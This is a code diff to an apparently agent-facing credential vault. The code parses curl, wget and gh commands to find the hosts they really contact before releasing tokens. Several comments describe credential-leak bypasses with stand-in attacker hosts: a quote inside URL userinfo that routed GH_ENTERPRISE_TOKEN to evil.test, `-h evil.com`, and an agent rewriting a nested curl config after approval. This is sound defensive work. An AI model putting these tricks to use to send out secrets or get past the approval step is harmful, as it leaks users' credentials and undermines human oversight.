@@ -331,7 +331,7 @@ const CURL_VALUE_FLAGS = ['-A', '--user-agent', '-b', '--cookie', '-c', '--cooki
 const WGET_VALUE_FLAGS = ['-O', '--output-document', '-o', '--output-file', '-a', '--append-output', '-P', '--directory-prefix', '-U', '--user-agent', '--header', '--user', '--password', '--http-user', '--http-password', '--post-data', '--post-file', '--body-data', '--body-file', '--method', '-t', '--tries', '-T', '--timeout', '--load-cookies', '--save-cookies', '--ca-certificate', '--certificate', '--private-key', '-w', '--wait', '-Q', '--quota', '--limit-rate', '-l', '--level', '-A', '--accept', '-R', '--reject', '-D', '--domains', '--exclude-domains', '-e', '--execute', '-B', '--base', '--bind-address', '--config', '-i', '--input-file'];
 const HTTPIE_VALUE_FLAGS = ['-a', '--auth', '-A', '--auth-type', '-o', '--output', '--session', '--session-read-only', '--cert', '--cert-key', '--cert-key-pass', '--ciphers', '--ssl', '--timeout', '--max-redirects', '--boundary', '--format-options', '-p', '--print', '-P', '--history-print', '--pretty', '-s', '--style', '--response-charset', '--response-mime', '--default-scheme', '--verify', '--proxy', '--raw'];
 const KNOWN_TOOLS = Object.freeze([
-  { name: 'curl', proxyEnv: true, bareHosts: 'all', globs: true, urlFlags: ['--url'], blindPrefixes: ['--expand-'], valueFlags: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc', '--interface'], configFlags: ['-K', '--config'], fileFlags: ['--cacert', '--capath', '-E', '--cert', '--key', '--netrc-file', '--hsts', '--etag-save', '--etag-compare'], configFileKeys: ['config', 'cacert', 'capath', 'cert', 'key', 'netrc-file', 'alt-svc', 'hsts', 'cookie-jar', 'upload-file', 'output', 'output-dir', 'etag-save', 'etag-compare', 'dump-header', 'trace', 'trace-ascii'], configDataKeys: ['data', 'data-binary', 'data-ascii'], configCookieKeys: ['cookie'] },   // round 18 (item 3): a config-FILE directive inside a shown -K template that names ANOTHER agent-writable file (config/cacert/cert/key/upload-file/data @file/cookie-file …) blinds «always» — the agent rewrites that file after the grant. round 3: a flag that redirects the connection off the URL's host (--alt-svc / --interface) is keyed; a value that is an agent-writable FILE (cert / ca / netrc / hsts cache) is a config class — blind unless it is the vault's own $VAULT_FILE
+  { name: 'curl', proxyEnv: true, bareHosts: 'all', globs: true, urlFlags: ['--url'], blindPrefixes: ['--expand-'], valueFlags: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '-K', '--config', ...CURL_VALUE_FLAGS], keyed: ['-x', '--proxy', '--preproxy', '--resolve', '--connect-to', '--socks4', '--socks4a', '--socks5', '--socks5-hostname', '--doh-url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--alt-svc', '--interface'], configFlags: ['-K', '--config'], fileFlags: ['--cacert', '--capath', '-E', '--cert', '--key', '--netrc-file', '--hsts', '--etag-save', '--etag-compare'], configFileKeys: ['alt-svc', 'cacert', 'capath', 'cert', 'config', 'cookie-jar', 'crlfile', 'dump-header', 'egd-file', 'etag-compare', 'etag-save', 'hsts', 'key', 'knownhosts', 'libcurl', 'netrc-file', 'output', 'output-dir', 'proxy-cacert', 'proxy-capath', 'proxy-cert', 'proxy-crlfile', 'proxy-key', 'pubkey', 'random-file', 'ssl-sessions', 'stderr', 'trace', 'trace-ascii', 'upload-file'], configDataKeys: ['data', 'data-ascii', 'data-binary', 'header', 'json', 'proxy-header', 'write-out'], configAtNameKeys: ['data-urlencode', 'url-query', 'variable'], configCookieKeys: ['cookie'], configNetrcKeys: ['netrc', 'netrc-optional'], configRouteKeys: ['connect-to', 'doh-url', 'ipfs-gateway', 'preproxy', 'proxy', 'resolve', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'url'], configRedirectKeys: ['location', 'location-trusted', 'proto-redir'], configFormKeys: ['form'], configExpandPrefix: 'expand-', configShort: { K: 'config', E: 'cert', b: 'cookie', d: 'data', c: 'cookie-jar', D: 'dump-header', o: 'output', T: 'upload-file', H: 'header', F: 'form', w: 'write-out', x: 'proxy', n: 'netrc', L: 'location' } },   // round 19 (item 4): DERIVED from `curl --help all` (every <file>/<dir>/<data>@/<name=content>@/<url>@ option, both spellings; the short map pins -K/-E/-b/-d/…) and PINNED by the census in test-vault-run-model (a curl that adds a file-reading option → red by name); route directives (url/connect-to/resolve/proxy) are ROUTE HOSTS, location/proto-redir → noAlways redirect, a {{var}} host → blind   // round 3: a flag that redirects the connection off the URL's host (--alt-svc / --interface) is keyed; a value that is an agent-writable FILE (cert / ca / netrc / hsts cache) is a config class — blind unless it is the vault's own $VAULT_FILE
   { name: 'wget', proxyEnv: true, bareHosts: 'all', prefixOpts: true, valueFlags: WGET_VALUE_FLAGS, keyed: ['-e', '--execute', '-B', '--base', '--bind-address', '--use-askpass'], configFlags: ['--config', '-i', '--input-file', '--input-metalink'], fileFlags: ['--ca-certificate', '--certificate', '--private-key', '--load-cookies', '--save-cookies'] },   // round 3 (m2): --input-metalink fetches every URL in its file (like -i); a cert / cookie file the agent writes is a config class
   { name: 'http', aka: ['https', 'httpie'], proxyEnv: true, bareHosts: 'first', valueFlags: HTTPIE_VALUE_FLAGS, keyed: ['--proxy'] },
   { name: 'gh', hosts: ['api.github.com', 'github.com'], hostEnv: ['GH_HOST'], sub: 2, proxyEnv: true, valueFlags: ['-R', '--repo', '--hostname'], hostFlags: ['--hostname'], repoFlags: ['-R', '--repo'], repoEnv: ['GH_REPO'], urlArgSubs: [['api']], freeText: true, blindSubs: [['repo', 'clone'], ['repo', 'fork'], ['repo', 'sync'], ['pr', 'checkout'], ['extension', 'install'], ['extension', 'upgrade']], blindFlagSubs: [{ sub: ['pr', 'merge'], longs: ['--delete-branch'], shorts: ['-d'] }, { sub: ['repo', 'create'], longs: ['--push', '--clone'], shorts: ['-c'] }], needFlagSubs: [{ sub: ['pr', 'create'], need: ['--head', '-H'], repo: true }], runSeal: { configDirEnv: 'GH_CONFIG_DIR', hostEnv: 'GH_HOST', credRef: 'GH_TOKEN', credEnvOther: 'GH_ENTERPRISE_TOKEN', childEnv: { GIT_CONFIG_GLOBAL: '/dev/null', GIT_CONFIG_NOSYSTEM: '1', GIT_TERMINAL_PROMPT: '0' } }, grammarVersion: '2.102.0', toolSha256: '7469124f706944133d6a169691dd1c6c3511b12e85878d255e044e2948df4c9b', envAllow: ["GH_REPO","GH_FORCE_TTY","NO_COLOR","CLICOLOR","TERM","LANG","TZ"], envAllowRe: ["^LC_[A-Z]+$"], envHijack: ["BROWSER","EDITOR","GH_BROWSER","GH_EDITOR","GH_PAGER","GH_PATH","GIT_EDITOR","PAGER","VISUAL"], grammar: {
@@ -519,14 +519,17 @@ function materialize(run, { valueOf, pathOf }) {
 }
 
 // ── THE SHAPE KEY (decision ④) ──
-// round 18 (item 1 BLOCKER): a URL's host is what the tool's OWN parser says — the WHATWG `URL`, never a hand-written regex.
-// URL_RE's userinfo pattern stopped at a `'` / `"` (`https://ghe.example.test'@evil.test/…`) so it read the host as
-// ghe.example.test while Go's url.Parse and Node's URL read evil.test — the pinned gh sent GH_ENTERPRISE_TOKEN to evil.test with no
-// card. URL_FIND_RE only LOCATES a scheme://… token (its boundary is whitespace / a double-quote / an angle bracket / a backtick,
-// never a byte that is legal inside userinfo); urlParse reads the host with `new URL` and names a credential-carrying URL
-// (userinfo) or one the parser rejects (bad). A URL with ANY userinfo is never a route (url_userinfo); an unparseable one is bad_host.
-const URL_FIND_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/[^\s"<>`]+/gi;
-const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/\.$/, ''); return x && x.length <= 253 ? (port ? `${x}:${port}` : x) : null; };
+// round 18/19 (item 1+2 BLOCKER): a URL's host is what the tool's OWN parser says — the WHATWG `URL`, never a hand-written regex.
+// URL_RE's userinfo pattern stopped at a `'` / `"` so it read `https://ghe.example.test'@evil.test/…` as ghe.example.test while Go
+// and curl read evil.test. Round 19: the locator runs a URL token to WHITESPACE only (the shell already split argv; inside one word
+// nothing ends a URL — a `"`, `<`, `>` or backtick is LEGAL inside userinfo, which curl/wget/WHATWG read the host PAST), and
+// urlParse (new URL) is the ONE authority on the host. A URL with ANY http(s) userinfo is never a route (url_userinfo, judged on ROUTE
+// words only); a URL the WHATWG parser REJECTS (an out-of-range port, a non-DNS name, a label > 63 / a name > 253, an empty host, a
+// `{{var}}`) is a BLIND authority — bad_host at the door, never a dropped host (Go/curl would still dial it). The divergence corpus is
+// a DOOR-level fuzz leg (whole argv words → routeHosts / userinfo / blind, compared to new URL, Go's trace and curl's %{url.host}).
+const URL_FIND_RE = /\b([a-z][a-z0-9+.-]{0,31}):\/\/\S+/gi;   // LOCATES a scheme://… token up to whitespace; the host is read by urlParse, never this regex
+const URL_TRAIL = /[),;!'"<>`]+$/;   // drop trailing prose terminators (a standalone argv token has none); the attack bytes are always mid-token (…<byte>@host/path), so a trailing strip never reopens the hole
+const normHost = (h, port = null) => { const x = String(h || '').toLowerCase().replace(/\.$/, ''); return x && x.length <= 253 && !/[{}]/.test(x) && !x.split('.').some((l) => l.length > 63) ? (port ? `${x}:${port}` : x) : null; };   // round 19 (item 1): a name > 253 chars or a label > 63 is not valid DNS (gh/curl still CONTACT it) — fail-CLOSED to bad_host; a `{{var}}` is never a host
 const GRAM_DEPTH = new WeakMap();   // round 7 (5b): the lead depth is the grammar's longest key (repo autolink create = 3 words), memoised per frozen grammar — never the constant row.sub (= 2, for blindSubs)
 const gramDepthOf = (g) => { let d = GRAM_DEPTH.get(g); if (d === undefined) { d = Math.max(1, ...Object.keys(g).map((k) => k.split(' ').length)); GRAM_DEPTH.set(g, d); } return d; };
 // round 7 (BLOCKER 2): a gh repository SPEC → the HOST gh resolves it to with go-gh's repository.Parse, or null for a default-host
@@ -537,16 +540,17 @@ const gramDepthOf = (g) => { let d = GRAM_DEPTH.get(g); if (d === undefined) { d
 const repoHostOf = (raw) => {
   const s = String(raw).trim();
   const strip = (h) => normHost(String(h).replace(/^www\./i, ''));   // round 8 (MINOR 2): go-gh's RepoInfoFromURL trims a leading www. (wire-proven on 2.102.0 for the URL, the scp-like AND the HOST/OWNER/REPO forms) — www.HOST targets HOST, so a value minted --for www.HOST must NOT silently pass
-  let m = /^(?:ssh|git\+ssh|git\+https|git|https?):\/\/(?:[^@/]*@)?([^/:]+)/i.exec(s);
-  if (m) return strip(m[1]) || '';
-  m = /^git@([^/:]+):/i.exec(s);
+  if (/^(?:ssh|git\+ssh|git\+https|git|https?):\/\//i.test(s)) { const r = urlParse(s); return r.host ? (strip(r.host.replace(/:\d+$/, '')) || '') : ''; }   // round 19 (item 3): go-gh/Go url.Parse read the host after the LAST @ (ssh://x@ghe:1@evil.test → evil.test, not first-@ ghe); port dropped for the host identity; a userinfo http(s) spec is caught by url_userinfo
+  let m = /^git@([^/:]+):/i.exec(s);
   if (m) return strip(m[1]) || '';
   const p = s.split('/');
   if (p.length >= 3) return strip(p[0]) || '';   // round 9 (BLOCKER): go-gh reads ANY 3-part first segment as the host and gh POSTs `Authorization: token …` there — a one-label `intranet/o/r` resolves on a search-domain network, an IPv6 literal `[fd00::1]/o/r` dials — so a 3-part spec host is read fail-CLOSED (the round-8 "looks like a host" gate that this reverts let a one-label / IPv6 host run ok:own with NO card). The REPO_DESC over-match that fed a mis-typed --branch here is fixed AT THE SOURCE (gen-gh-grammar.mjs REPO_NAME: --branch / --source-ref / --signer-workflow are NOT repoValues), so repoHostOf only ever sees a real spec
   return null;
 };
-/** The WHATWG host of one URL token (scheme://…). { host } | { userinfo:true } (a credential-carrying URL — never a route) |
- *  { bad:true } (the WHATWG parser rejects the token). The one authority on a URL's host — no regex reads it. */
+/** The WHATWG host of one URL token (scheme://…). { host, userinfo } (userinfo:true = a credential-carrying URL, never an http(s)
+ *  route) | { bad:true } (the WHATWG parser REJECTS the token: an out-of-range port, a non-DNS name, a label > 63 / a name > 253, an
+ *  empty host, a `{{var}}`). The one authority on a URL's host — no regex reads it; a rejected token is a BLIND authority (bad_host),
+ *  never a dropped host (Go/curl would still dial it). */
 function urlParse(token) {
   let u; try { u = new URL(String(token)); } catch { return { bad: true }; }
   const h = normHost(u.hostname, u.port || null);   // the WHATWG host is read PAST the userinfo (`https://ghe'@evil.test` ⇒ evil.test), so a route still sees the real host
@@ -559,17 +563,30 @@ function urlHosts(text) {
   const out = []; let m; URL_FIND_RE.lastIndex = 0;
   while ((m = URL_FIND_RE.exec(String(text)))) {
     const scheme = m[1].toLowerCase(); if (scheme === 'vault') continue;
-    const token = m[0].replace(/[),;!]+$/, '');   // drop trailing prose punctuation (a standalone argv token has none; keep `.`/`]` — an FQDN root / an IPv6 bracket)
+    const token = m[0].replace(URL_TRAIL, '');
     const auth = token.slice(scheme.length + 3).split(/[/?#]/)[0];
     for (const part of auth.split(',')) { const r = urlParse(`${scheme}://${part.trim()}/`); if (r.host) out.push(r.host); }
   }
   return out.filter(Boolean);
 }
+/** round 19 (item 1 BLOCKER): a located scheme://… token the WHATWG parser REJECTS (out-of-range port, non-DNS name, empty host,
+ *  `{{var}}`) — a BLIND authority. On a ROUTE position (a gh <url>/<endpoint> positional) this must bad_host at the door, never be a
+ *  dropped host: gh drops a bad port and still CONTACTS the host, so the token vanishing from routeHosts leaked the token to it. */
+function urlHostsBad(text) {
+  let m; URL_FIND_RE.lastIndex = 0;
+  while ((m = URL_FIND_RE.exec(String(text)))) {
+    const scheme = m[1].toLowerCase(); if (scheme === 'vault') continue;
+    const token = m[0].replace(URL_TRAIL, '');
+    const auth = token.slice(scheme.length + 3).split(/[/?#]/)[0];
+    if (auth.split(',').some((part) => urlParse(`${scheme}://${part.trim()}/`).bad)) return true;
+  }
+  return false;
+}
 /** Does any http(s) URL token in the text carry userinfo (user[:pass]@host)? A credential-carrying URL is never a route — the door
  *  refuses url_userinfo. Scoped to http/https: ssh / git / ftp legitimately carry userinfo (a `git@` remote, an ftp login). */
 function urlUserinfo(text) {
   let m; URL_FIND_RE.lastIndex = 0;
-  while ((m = URL_FIND_RE.exec(String(text)))) { const s0 = m[1].toLowerCase(); if ((s0 === 'http' || s0 === 'https') && urlParse(m[0].replace(/[),;!]+$/, '')).userinfo) return true; }
+  while ((m = URL_FIND_RE.exec(String(text)))) { const s0 = m[1].toLowerCase(); if ((s0 === 'http' || s0 === 'https') && urlParse(m[0].replace(URL_TRAIL, '')).userinfo) return true; }
   return false;
 }
 // lane vault-agent-own (round 2) — the hosts the table did not read and the tool still goes to
@@ -653,23 +670,72 @@ function configTemplateShown(v, run) {
  *  that nested file AFTER an «always» grant and route the value to a new host with no card. The template's own directives are
  *  parsed for the row's declared file-reading keys; the FIRST one that names a file (or an @file) the card cannot show is
  *  returned as `key value` (so the card names it). A curl config line is `[--]key[ =:]value`, `#` comments, quotes optional. */
+/** round 19 (item 4): curl's OWN config-file grammar (src/tool_parsecfg.c), pinned by the table test in test-vault-run §parseCfgLine:
+ *  skip leading whitespace; a line whose first non-space char is `#` is a comment; the option word runs to whitespace / `=` / `:`
+ *  (an optional leading `-`/`--` is stripped); one `=`/`:`/whitespace separates it from the parameter; a `"`-quoted parameter is read
+ *  with curl's escapes (\\, \", \t, \n, \r, \v) to the closing quote (the rest of the line — e.g. a trailing `# comment` — is
+ *  discarded); an unquoted parameter is the rest of the line, trailing whitespace trimmed. A single-letter option is case-SENSITIVE
+ *  (-K config vs -k insecure); a long option is matched case-insensitively (fail-closed). */
+function parseCfgLine(raw) {
+  const s = String(raw).replace(/^\uFEFF/, '');
+  let i = 0; while (i < s.length && /\s/.test(s[i])) i++;
+  if (i >= s.length || s[i] === '#') return { key: null, val: '' };
+  let j = i; while (j < s.length && !/\s/.test(s[j]) && s[j] !== '=' && s[j] !== ':') j++;
+  const key = s.slice(i, j).replace(/^-+/, '');
+  if (!key) return { key: null, val: '' };
+  while (j < s.length && /\s/.test(s[j])) j++;
+  if (s[j] === '=' || s[j] === ':') j++;
+  while (j < s.length && /\s/.test(s[j])) j++;
+  if (s[j] === '"') { let out = ''; j++; while (j < s.length && s[j] !== '"') { if (s[j] === '\\' && j + 1 < s.length) { const c = s[++j]; out += ({ n: '\n', t: '\t', r: '\r', v: '\v' })[c] || c; } else out += s[j]; j++; } return { key, val: out }; }
+  return { key, val: s.slice(j).replace(/\s+$/, '') };
+}
+/** a scheme-less (`evil.test/x`) or scheme (`https://evil.test/x`) URL value → its host(s); userinfo stripped. */
+function cfgBareOrUrl(v) {
+  const t = String(v).trim();
+  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(t)) return urlHosts(t);
+  const h = normHost(t.split(/[\/?#]/)[0].replace(/^[^@]*@/, ''));
+  return h ? [h] : [];
+}
+/** a curl route directive's value → { hosts } | { blind:true } (a {{var}} host, made at run time) | { file:true } (url = @file). */
+function cfgRouteHosts(key, v) {
+  const t = String(v).trim();
+  if (/\{\{|\}\}/.test(t)) return { blind: true };
+  if (key === 'url') return t[0] === '@' ? { file: true } : { hosts: cfgBareOrUrl(t) };
+  if (key === 'doh-url' || key === 'ipfs-gateway') return { hosts: cfgBareOrUrl(t) };
+  if (key === 'connect-to') { const f = t.split(':'); const h = normHost((f[2] || '').trim()); return { hosts: h ? [h] : [] }; }   // HOST1:PORT1:HOST2:PORT2 — curl connects to HOST2
+  if (key === 'resolve') { const f = t.replace(/^\+/, '').split(':'); const h = normHost((f[0] || '').trim()), a = normHost((f.slice(2).join(':') || '').replace(/^\[|\]$/g, '').trim()); return { hosts: [h, a].filter(Boolean) }; }
+  const m = /^(?:[a-z][a-z0-9+.-]{0,31}:\/\/)?(?:[^@/]*@)?([^/:]+)/i.exec(t);   // proxy / preproxy / socks: [protocol://]host[:port]
+  const h = m ? normHost(m[1]) : null; return { hosts: h ? [h] : [] };
+}
+/** round 18/19 (item 3/4): a curl config TEMPLATE the card shows in full can NEST another agent-writable file, ROUTE the connection
+ *  off the URL's host, REDIRECT, or make the destination at run time. Parsed with curl's own grammar (parseCfgLine). Returns
+ *  { reads: 'key value'|null (the FIRST directive that reads/writes a file, routes, redirects or expands — «always» withheld, named),
+ *  hosts: [the route hosts the template names, added to the Hosts line], blind: bool (a {{var}} / opaque route — the destination is
+ *  unknowable) }. The row's category sets are DERIVED from `curl --help all` and pinned by the census (test-vault-run-model). */
 function configNestedFile(text, row) {
-  const fileKeys = new Set((row.configFileKeys || []).map((k) => k.toLowerCase()));
-  const dataKeys = new Set((row.configDataKeys || []).map((k) => k.toLowerCase()));
-  const cookieKeys = new Set((row.configCookieKeys || []).map((k) => k.toLowerCase()));
-  if (!fileKeys.size && !dataKeys.size && !cookieKeys.size) return null;
+  const short = row.configShort || {};
+  const S = (list) => new Set(list || []);
+  const fileK = S(row.configFileKeys), dataK = S(row.configDataKeys), atNameK = S(row.configAtNameKeys), cookieK = S(row.configCookieKeys),
+    netrcK = S(row.configNetrcKeys), routeK = S(row.configRouteKeys), redirK = S(row.configRedirectKeys), formK = S(row.configFormKeys), expand = row.configExpandPrefix || null;
+  if (![fileK, dataK, atNameK, cookieK, netrcK, routeK, redirK, formK].some((x) => x.size) && !expand) return { reads: null, hosts: [], blind: false };
+  let reads = null, blind = false; const hostsOut = [];
+  const name = (k, v) => { if (!reads) reads = v ? `${k} ${v}` : k; };
   for (const raw of String(text).split(/\r?\n/)) {
-    const line = raw.trim();
-    if (!line || line[0] === '#') continue;
-    const mm = /^(?:--)?([A-Za-z][A-Za-z0-9-]*)[\s:=]+["']?(.*?)["']?\s*$/.exec(line);
-    if (!mm) continue;
-    const key = mm[1].toLowerCase(), val = mm[2].trim();
+    const { key, val } = parseCfgLine(raw);
+    if (key == null) continue;
+    const canon = key.length === 1 ? (short[key] || key) : key.toLowerCase();
+    if (expand && canon.startsWith(expand)) { blind = true; name(canon, val); continue; }
+    if (netrcK.has(canon)) { name(canon, ''); continue; }   // --netrc reads ~/.netrc, a file this card cannot show
+    if (redirK.has(canon)) { name(canon, val); continue; }   // --location / --proto-redir: the redirect destination is the server's choice
+    if (routeK.has(canon)) { const r = cfgRouteHosts(canon, val); if (r.blind) { blind = true; name(canon, val); } else if (r.file) { name(canon, val); } else if (r.hosts && r.hosts.length) { hostsOut.push(...r.hosts); name(canon, val); } continue; }
     if (!val) continue;
-    if (fileKeys.has(key)) return `${key} ${val}`;
-    if (dataKeys.has(key) && val[0] === '@' && val !== '@-') return `${key} ${val}`;   // --data @file reads a file; inline data / @- (stdin) / --data-raw do not
-    if (cookieKeys.has(key) && !val.includes('=')) return `${key} ${val}`;   // curl -b: a value with `=` is inline cookie data, without it a filename
+    if (fileK.has(canon)) { name(canon, val); continue; }
+    if (dataK.has(canon) && val[0] === '@' && val !== '@-') { name(canon, val); continue; }   // --data/--header @file reads a file; inline / @- (stdin) / --data-raw do not
+    if (atNameK.has(canon)) { const at = val.indexOf('@'); if (at >= 0 && !val.slice(0, at).includes('=') && val.slice(at + 1) && val.slice(at + 1) !== '-') { name(canon, val); continue; } }   // --variable name@file / --data-urlencode name@file (the @ is not after a `=`)
+    if (cookieK.has(canon) && !val.includes('=')) { name(canon, val); continue; }   // curl -b: a value with `=` is inline cookie data, without it a filename
+    if (formK.has(canon) && /=[@<]/.test(val)) { name(canon, val); continue; }   // -F field=@file (upload) / field=<file (read content)
   }
-  return null;
+  return { reads, hosts: hostsOut.filter(Boolean), blind };
 }
 /** getopt's short-flag cluster: the first letter that takes a value takes the rest of the word (`-hHOST`, `-sSo out`) or the next word. */
 function shortSplit(a, takes) { for (let i = 1; i < a.length; i++) { const f = '-' + a[i]; if (takes.includes(f)) { let v = i + 1 < a.length ? a.slice(i + 1) : null; if (v && v[0] === '=') v = v.slice(1); return { f, head: a.slice(0, i + 1), v }; } } return null; }   // round 2b: `-s=https://…` (Go flags) drops the `=`
@@ -721,7 +787,7 @@ function shapeOf(run) {
   }
   // THE HOSTS: every URL anywhere (the command, the plain env values, the templates) + the row's own rules; its defaults when none
   const hosts = new Set([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].flatMap(urlHosts));
-  const routeHosts = new Set();   // round 14 (MAJOR): ONLY gh's ROUTING inputs — -R/--repo, --hostname, GH_HOST, a spec positional's host — the SEAL's host, distinct from `hosts` (the card's words; a URL in a body/title/template/env value is NOT a routing host)
+  const routeHosts = new Set(), routeWords = [];   // round 14 (MAJOR): ONLY gh's ROUTING inputs — -R/--repo, --hostname, GH_HOST, a spec positional's host — the SEAL's host, distinct from `hosts` (the card's words; a URL in a body/title/template/env value is NOT a routing host)
   if (row && kind === 'tool') {
     const vals = (list) => valued.filter(([f]) => (list || []).includes(f)).map(([, v]) => v).filter((v) => v !== '');   // round 11 (MAJOR 3): an EMPTY value (--head= / -H "" / -R "") is ABSENT — gh falls back (pr create resolves the CWD repo + runs git status over core.fsmonitor; an empty -R uses the CWD remotes), so NO value-flag read counts it as present
     const envs = (list) => run.plainEnv.filter((e) => (list || []).includes(e.name) && e.value).map((e) => e.value);
@@ -731,17 +797,17 @@ function shapeOf(run) {
     if (row.sshTarget && positionals.length) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(positionals[0]); if (m) hosts.add(normHost(m[1])); }
     const hostFlagList = [...(row.hostFlags || []), ...(vg && vg.host ? [vg.host] : [])];   // round 5: -h is --hostname only under the verb that defines it (gh auth status -h evil.com sends GH_ENTERPRISE_TOKEN there) — the grammar carries the per-verb short
     const defHost = (row.hosts || []).find((h) => !/^api\./i.test(h)) || (row.hosts || [])[0] || null;   // round 14: the tool's user-facing default routing host (gh: github.com, not api.github.com) — a 2-part OWNER/REPO routes there
-    if (hostFlagList.length) for (const v of vals(hostFlagList)) if (!/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(v)) many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); });   // -h x · --host=x · -hx (round 2); a URL value (kubectl -s https://…) is read by the top-level flatMap; round 14: a --hostname is a ROUTING host
+    if (hostFlagList.length) for (const v of vals(hostFlagList)) { routeWords.push(v); if (!/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(v)) many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); }); }   // -h x · --host=x · -hx (round 2); a URL value (kubectl -s https://…) is read by the top-level flatMap; round 14: a --hostname is a ROUTING host
     if (row.scriptFlags) for (const v of vals(row.scriptFlags)) if (row.escapes.test(v)) unread = true;   // round 2: a client's shell escape — where it sends is the shell's
     if (row.registry) for (const a of positionals) { const h = a.split('/')[0]; if (HOSTNAME.test(h.replace(/:\d+$/, ''))) hosts.add(normHost(h)); }
-    if (row.hostEnv) for (const v of envs(row.hostEnv)) many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); });   // round 14: GH_HOST is a ROUTING host
-    if (row.bareHosts) for (const a of [...(row.bareHosts === 'first' ? httpieTarget(positionals) : positionals), ...vals(row.urlFlags)]) { if (String(a).startsWith('@')) { unread = true; continue; } const t = targetOf(a, !!row.globs, row.bareHosts === 'all'); if (t.host) hosts.add(t.host); if (t.unread) unread = true; }   // round 2b: `--url @file` / `@urls.txt` reads the real targets from a file
+    if (row.hostEnv) for (const v of envs(row.hostEnv)) { routeWords.push(v); many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); }); }   // round 14: GH_HOST is a ROUTING host
+    if (row.bareHosts) for (const a of [...(row.bareHosts === 'first' ? httpieTarget(positionals) : positionals), ...vals(row.urlFlags)]) { if (String(a).startsWith('@')) { unread = true; continue; } routeWords.push(a); const t = targetOf(a, !!row.globs, row.bareHosts === 'all'); if (t.host) hosts.add(t.host); if (t.unread) unread = true; }   // round 2b: `--url @file` / `@urls.txt` reads the real targets from a file
     if (row.conninfo) for (const a of [...argv.slice(1), ...vals(['-d', '--dbname'])]) { conninfoHosts(a).forEach((h) => hosts.add(h)); if (conninfoUriBlind(a)) unread = true; }
     const repoSpec = vg && vg.spec ? positionals : [];   // round 5/7: a `spec` verb reads EVERY positional (repo view's <repository>, repo create's <name>, issue transfer's SECOND positional <destination-repo>)
     const repoVals = vg && vg.repoValues ? vals(vg.repoValues) : [];   // round 6/7: every value the help TYPEs OR DESCRIBES as a repository (the inherited -R, repo create --template, issue develop --branch-repo)
-    if (row.repoFlags) for (const v of [...vals(row.repoFlags), ...envs(row.repoEnv), ...repoSpec, ...repoVals]) { const h = repoHostOf(v); if (h) { hosts.add(h); routeHosts.add(h); } else if (h === '') unread = true; else if (/^[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+$/.test(String(v).trim())) routeHosts.add(defHost); }   // round 14: a repo spec's HOST is a ROUTING host (a clean 2-part OWNER/REPO ⇒ the default host)   // round 7 (BLOCKER 2): repoHostOf reads every form go-gh accepts (the scp-like git@HOST:O/R + ssh/https URLs incl.); a 2-part OWNER/REPO ⇒ the default host; a 3-part spec with an unreadable host ⇒ blind
-    if (row.urlArgSubs && row.urlArgSubs.some((b) => b.every((w, i) => ghLead[i] === w))) { const ep = positionals[0]; if (ep != null) urlHosts(ep).forEach((h) => routeHosts.add(h)); }   // a full-URL endpoint is a ROUTE host; a path falls to the default host via the !routeHosts default below (gh api --hostname evil keeps evil only)   // round 15 (MAJOR): gh api <endpoint> — a full-URL positional is the host gh contacts (a ROUTE host); a path routes to the default host
-    if (vg && vg.urlArg) for (const p of positionals) urlHosts(p).forEach((h) => routeHosts.add(h));   // round 16 (BLOCKER): a verb whose POSITIONAL may be a URL (`<url>` in its usage — issue view/close/comment, pr view/checks/comment; DERIVED from the live help, never hand-picked) CONTACTS that URL's host — a ROUTE host whatever syntax carries it; a URL host that DIFFERS from the -R / GH_HOST host is TWO route hosts ⇒ the door refuses two_hosts (never sends GH_ENTERPRISE_TOKEN to the URL's host silently)
+    if (row.repoFlags) for (const v of [...vals(row.repoFlags), ...envs(row.repoEnv), ...repoSpec, ...repoVals]) { routeWords.push(v); const h = repoHostOf(v); if (h) { hosts.add(h); routeHosts.add(h); } else if (h === '') unread = true; else if (/^[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+$/.test(String(v).trim())) routeHosts.add(defHost); }   // round 14: a repo spec's HOST is a ROUTING host (a clean 2-part OWNER/REPO ⇒ the default host)   // round 7 (BLOCKER 2): repoHostOf reads every form go-gh accepts (the scp-like git@HOST:O/R + ssh/https URLs incl.); a 2-part OWNER/REPO ⇒ the default host; a 3-part spec with an unreadable host ⇒ blind
+    if (row.urlArgSubs && row.urlArgSubs.some((b) => b.every((w, i) => ghLead[i] === w))) { const ep = positionals[0]; if (ep != null) { routeWords.push(ep); urlHosts(ep).forEach((h) => routeHosts.add(h)); if (urlHostsBad(ep)) routeHosts.add(null); } }   // a full-URL endpoint is a ROUTE host; a path falls to the default host via the !routeHosts default below (gh api --hostname evil keeps evil only)   // round 15 (MAJOR): gh api <endpoint> — a full-URL positional is the host gh contacts (a ROUTE host); a path routes to the default host
+    if (vg && vg.urlArg) for (const p of positionals) { routeWords.push(p); urlHosts(p).forEach((h) => routeHosts.add(h)); if (urlHostsBad(p)) routeHosts.add(null); }   // round 16 (BLOCKER): a verb whose POSITIONAL may be a URL (`<url>` in its usage — issue view/close/comment, pr view/checks/comment; DERIVED from the live help, never hand-picked) CONTACTS that URL's host — a ROUTE host whatever syntax carries it; a URL host that DIFFERS from the -R / GH_HOST host is TWO route hosts ⇒ the door refuses two_hosts (never sends GH_ENTERPRISE_TOKEN to the URL's host silently)
